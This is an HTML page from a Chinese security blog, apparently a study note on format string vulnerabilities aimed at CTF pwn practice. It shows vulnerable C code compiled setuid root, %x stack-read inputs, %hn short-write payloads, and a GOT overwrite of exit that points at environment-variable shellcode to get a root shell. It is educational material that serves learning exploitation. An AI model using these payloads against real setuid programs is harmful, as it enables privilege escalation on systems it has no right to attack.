@@ -1,0 +1,1259 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back(-1);
+                <!--window.location.href='https://kevien.github.io'-->;
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="reverse,linux," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="TL;DR 不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这两天学习了一下，仅当笔记留以备忘。 在了解格式化字符串漏洞之前还是应该先了解一下printf函数的基本功能。 可以使用命令 man 3 printf 查看printf函数的功能介绍，其中printf是c语言中为数不多的支持可变参数的库函数。根据cdecl的函数调用规定，函数从最右边的">
+<meta name="keywords" content="reverse,linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="http://kevien.github.io/2018/04/07/格式化字符串漏洞/index.html">
+<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:description" content="TL;DR 不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这两天学习了一下，仅当笔记留以备忘。 在了解格式化字符串漏洞之前还是应该先了解一下printf函数的基本功能。 可以使用命令 man 3 printf 查看printf函数的功能介绍，其中printf是c语言中为数不多的支持可变参数的库函数。根据cdecl的函数调用规定，函数从最右边的">
+<meta property="og:image" content="http://kevien.github.io/2018/04/07/格式化字符串漏洞/memread.png">
+<meta property="og:image" content="http://kevien.github.io/2018/04/07/格式化字符串漏洞/readspecifyadd.png">
+<meta property="og:image" content="http://kevien.github.io/2018/04/07/格式化字符串漏洞/objgot.png">
+<meta property="og:image" content="http://kevien.github.io/2018/04/07/格式化字符串漏洞/shell1.png">
+<meta property="og:image" content="http://kevien.github.io/2018/04/07/格式化字符串漏洞/shell2.png">
+<meta property="og:updated_time" content="2018-08-24T04:26:49.545Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="格式化字符串漏洞">
+<meta name="twitter:description" content="TL;DR 不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这两天学习了一下，仅当笔记留以备忘。 在了解格式化字符串漏洞之前还是应该先了解一下printf函数的基本功能。 可以使用命令 man 3 printf 查看printf函数的功能介绍，其中printf是c语言中为数不多的支持可变参数的库函数。根据cdecl的函数调用规定，函数从最右边的">
+<meta name="twitter:image" content="http://kevien.github.io/2018/04/07/格式化字符串漏洞/memread.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://kevien.github.io/2018/04/07/格式化字符串漏洞/"/>
+
+
+
+
+
+  <title>格式化字符串漏洞 | M0rk's Blog</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">M0rk's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/04/07/格式化字符串漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                格式化字符串漏洞
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-07T05:37:24+08:00">
+                2018-04-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这两天学习了一下，仅当笔记留以备忘。</li>
+<li>在了解格式化字符串漏洞之前还是应该先了解一下printf函数的基本功能。</li>
+<li>可以使用命令 man 3 printf 查看printf函数的功能介绍，其中printf是c语言中为数不多的支持可变参数的库函数。根据cdecl的函数调用规定，函数从最右边的参数开始，逐个压栈。如果要传入的是一个字符串，那么就将字符串的指针压栈。这一切都井井有条的进行着。如果是一般的函数，函数的调用者和被调用者都应该知道函数的参数个数以及每个参数的类型。但是对于像printf这种可变参数的函数来说，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数调用者传入的格式一个一个的打印出数据。</li>
+<li>测试环境ubuntuX86<h4 id="任意内存读取"><a href="#任意内存读取" class="headerlink" title="任意内存读取"></a>任意内存读取</h4></li>
+<li><p>如下是函数printf format的参数、输入类型以及输出类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">| Parameter  |  Input Type | Output Type                    |</div><div class="line">| - - - - - -| - - - - - - | - - - - - - - - - - - - - - -  |</div><div class="line">| %d         | Value       | Decimal                        |</div><div class="line">| %u         | Value       | Unsigned decimal               |</div><div class="line">| %x         | Value       | Hexadecimal                    |</div><div class="line">| %s         | Pointer     | String                         |</div><div class="line">| %n         | Pointer     | Number of bytes written so far |</div></pre></td></tr></table></figure>
+</li>
+<li><p>试想有这样一种情况，我们要求printf打印的数据数量大于我们所给的数量会怎样？printf函数不可能知道栈帧中哪一些数据是它传入的参数，哪些是属于函数调用者的数据。</p>
+</li>
+<li>vuln code<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#fmt_vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">   char text[1024];</div><div class="line">   static int test_val = -72;</div><div class="line"></div><div class="line">   if(argc &lt; 2) &#123;</div><div class="line">      printf(&quot;Usage: %s &lt;text to print&gt;\n&quot;, argv[0]);</div><div class="line">      exit(0);</div><div class="line">   &#125;</div><div class="line">   strcpy(text, argv[1]);</div><div class="line"></div><div class="line">   printf(&quot;The right way to print user-controlled input:\n&quot;);</div><div class="line">   printf(&quot;%s&quot;, text);</div><div class="line"></div><div class="line"></div><div class="line">   printf(&quot;\nThe wrong way to print user-controlled input:\n&quot;);</div><div class="line">   printf(text);</div><div class="line"></div><div class="line">   printf(&quot;\n&quot;);</div><div class="line"></div><div class="line">   // Debug output</div><div class="line">   printf(&quot;[*] test_val @ 0x%08x = %d 0x%08x\n&quot;, &amp;test_val, test_val, test_val);</div><div class="line"></div><div class="line">   exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">编译指令：</div><div class="line">gcc -g fmt_vuln.c -o fmt_vuln</div><div class="line">sudo chown root fmt_vuln</div><div class="line">sudo chmod u+s fmt_vuln</div></pre></td></tr></table></figure>
+<ul>
+<li>当我们输入 AAAA%08x.%08x.%08x.%08x可以看到我们读取到了保存于栈中的数据（输入的AAAA），当然如果输入的%08x更多还会读取到栈中更多的数据<br><img src="/2018/04/07/格式化字符串漏洞/memread.png" alt=""></li>
+<li>如果写入的AAAA是一个敏感的地址呢，比如指向敏感字符串的地址。<br><img src="/2018/04/07/格式化字符串漏洞/readspecifyadd.png" alt=""><h4 id="任意内存写入"><a href="#任意内存写入" class="headerlink" title="任意内存写入"></a>任意内存写入</h4></li>
+<li>任意内存写入需要用到%n这个不常用的参数，它的功能是将%n之前printf已经打印的字符个数赋值给传入的指针,通过%n我们就可以修改内存中的值了。还是原来的漏洞代码。</li>
+<li><p>此外还需要$的配合，如下的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printf(&quot;7th: %7$d, 4th: %4$05d\n&quot;, 10, 20, 30, 40, 50, 60, 70, 80);</div></pre></td></tr></table></figure>
+</li>
+<li><p>会打印输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">7th: 70, 4th: 00040</div></pre></td></tr></table></figure>
+</li>
+<li><p>即%7$d 获取的将是参数列表中第7个元素的值，%4$05d 获取的是第四个参数的值，且有效位长度是5</p>
+</li>
+<li>使用short writes,一个四字节的值可以使用两个%hn去完成覆盖。</li>
+<li>例如下面的输入  $(printf “\x30\xa0\x04\x08\x32\xa0\x04\x08”)%43699x%4\$hn%8738x%5\$hn 会将test_val地址的值修改为0xccddaabb<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ gdb -q </div><div class="line">gdb-peda$ p/h 0xaabb - 8</div><div class="line">Size letters are meaningless in &quot;print&quot; command.</div><div class="line">gdb-peda$ p/d 0xaabb - 8</div><div class="line">$1 = 43699</div><div class="line">gdb-peda$ p/d 0xccdd - 0xaabb</div><div class="line">$2 = 8738</div><div class="line">gdb-peda$ quit</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  123</div><div class="line">The right way to print user-controlled input:</div><div class="line">123</div><div class="line">The wrong way to print user-controlled input:</div><div class="line">123</div><div class="line">[*] test_val @ 0x0804a030 = -72 0xffffffb8</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  $(printf &quot;\x30\xa0\x04\x08\x32\xa0\x04\x08&quot;)%43699x%4\$hn%8738x%5\$hn</div><div class="line">The right way to print user-controlled input:</div><div class="line">0�2�%43699x%4$hn%8738x%5$hn</div><div class="line">The wrong way to print user-controlled input:</div><div class="line">0�2� ...</div><div class="line">[*] test_val @ 0x0804a030 = -857888069 0xccddaabb</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="覆盖GOT表"><a href="#覆盖GOT表" class="headerlink" title="覆盖GOT表"></a>覆盖GOT表</h4><ul>
+<li>可能会有人问能不能通过这种漏洞来getshell呢，答案是可以的，且方法不止一种，下面介绍一种相对来说简单且常用的方法，通过覆盖GOT表方法来getshell的trick，总体的思路就是程序最后要执行exit函数，我们覆盖exit函数的地址为shellcode的地址来达到getshell的目的。</li>
+<li>我们知道一个程序可以使用共享库，那么它必然有一个存放了各个函数对应的地址的表，这个表就是PLT(procedure linkage table)。</li>
+<li><p>使用objdump 查看plt section</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -d -j .plt ./fmt_vuln</div><div class="line"></div><div class="line">./fmt_vuln:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .plt:</div><div class="line"></div><div class="line">08048360 &lt;printf@plt-0x10&gt;:</div><div class="line"> 8048360:	ff 35 04 a0 04 08    	pushl  0x804a004</div><div class="line"> 8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008</div><div class="line"> 804836c:	00 00                	add    %al,(%eax)</div><div class="line">	...</div><div class="line"></div><div class="line">08048370 &lt;printf@plt&gt;:</div><div class="line"> 8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c</div><div class="line"> 8048376:	68 00 00 00 00       	push   $0x0</div><div class="line"> 804837b:	e9 e0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">08048380 &lt;strcpy@plt&gt;:</div><div class="line"> 8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010</div><div class="line"> 8048386:	68 08 00 00 00       	push   $0x8</div><div class="line"> 804838b:	e9 d0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">08048390 &lt;puts@plt&gt;:</div><div class="line"> 8048390:	ff 25 14 a0 04 08    	jmp    *0x804a014</div><div class="line"> 8048396:	68 10 00 00 00       	push   $0x10</div><div class="line"> 804839b:	e9 c0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483a0 &lt;__gmon_start__@plt&gt;:</div><div class="line"> 80483a0:	ff 25 18 a0 04 08    	jmp    *0x804a018</div><div class="line"> 80483a6:	68 18 00 00 00       	push   $0x18</div><div class="line"> 80483ab:	e9 b0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483b0 &lt;exit@plt&gt;:</div><div class="line"> 80483b0:	ff 25 1c a0 04 08    	jmp    *0x804a01c</div><div class="line"> 80483b6:	68 20 00 00 00       	push   $0x20</div><div class="line"> 80483bb:	e9 a0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483c0 &lt;__libc_start_main@plt&gt;:</div><div class="line"> 80483c0:	ff 25 20 a0 04 08    	jmp    *0x804a020</div><div class="line"> 80483c6:	68 28 00 00 00       	push   $0x28</div><div class="line"> 80483cb:	e9 90 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483d0 &lt;putchar@plt&gt;:</div><div class="line"> 80483d0:	ff 25 24 a0 04 08    	jmp    *0x804a024</div><div class="line"> 80483d6:	68 30 00 00 00       	push   $0x30</div><div class="line"> 80483db:	e9 80 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>如上所示可以看到exit函数的相关跳转，但是这个plt section是READONLY即只读不可修改的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -h ./fmt_vuln | grep -A1 &quot;\ .plt\ &quot;</div><div class="line"> 11 .plt          00000080  08048360  08048360  00000360  2**4</div><div class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</div></pre></td></tr></table></figure>
+</li>
+<li><p>但如果仔细看的话，可以知道jmp    *0x804a01c 中的jmp地址并不是一个直接的地址，而是一个指针指向的地址，即exit函数的地址是存放在地址0x804a01c处的。</p>
+</li>
+<li>这些个地址是存在放另外的section的，叫做global offset table(GOT),它是可写的。然后通过objdump可以获取的到。<br><img src="/2018/04/07/格式化字符串漏洞/objgot.png" alt=""> </li>
+<li><p>如上说明exit函数是在0x0804a01c这个地址上的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./fmt_vuln $(printf &quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08&quot;)%49143x%4\$hn%12981x%5\$hn</div></pre></td></tr></table></figure>
+</li>
+<li><p>这次我们还是将shellcode放入到环境变量中，然后将exit函数的地址指向shellcode所存放的环境变量(这种一般是用在提权操作上,普通用户运行了setuid的程序)<br><img src="/2018/04/07/格式化字符串漏洞/shell1.png" alt=""><br><img src="/2018/04/07/格式化字符串漏洞/shell2.png" alt=""></p>
+</li>
+<li>如上，当程序调用exit函数的时候，通过PLT跳转并在GOT表中获取到了调用的地址,由于这个地址已经被修改为shellcode的入口地址，所以我们就获取到了root权限的shell。</li>
+<li>可以写任意地址其实就提供了很多种可能性，只要是可写的内存且包含了程序执行流的都可以是写入的目标。<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>这里就主要过程做了说明，想要真正理解还需要自己动手去实践。<br><a href="https://github.com/kevien/exploitcode/tree/master/formatstringexp" target="_blank" rel="external">github repo</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li>《Hacking the art of exploitation》0x352</li>
+<li>漏洞挖掘基础之格式化字符串<br><a href="http://drops.xmd5.com/static/drops/papers-9426.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-9426.html</a></li>
+<li>格式化字符串漏洞简介<br><a href="http://drops.xmd5.com/static/drops/binary-7714.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/binary-7714.html</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/reverse/" rel="tag"># reverse</a>
+          
+            <a href="/tags/linux/" rel="tag"># linux</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/18/FastJson反序列化漏洞(续)/" rel="next" title="FastJson反序列化漏洞(续)">
+                <i class="fa fa-chevron-left"></i> FastJson反序列化漏洞(续)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/22/BSS段的溢出攻击/" rel="prev" title="BSS段的溢出攻击">
+                BSS段的溢出攻击 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//kevien.github.io/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="M0rk" />
+          <p class="site-author-name" itemprop="name">M0rk</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/kevien" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/TTByaw" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://weibo.com/wuyanzu" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#TL-DR"><span class="nav-number">1.</span> <span class="nav-text">TL;DR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#任意内存读取"><span class="nav-number">2.</span> <span class="nav-text">任意内存读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#任意内存写入"><span class="nav-number">3.</span> <span class="nav-text">任意内存写入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#覆盖GOT表"><span class="nav-number">4.</span> <span class="nav-text">覆盖GOT表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其它"><span class="nav-number">5.</span> <span class="nav-text">其它</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">6.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M0rk</span>
+</div>
+
+
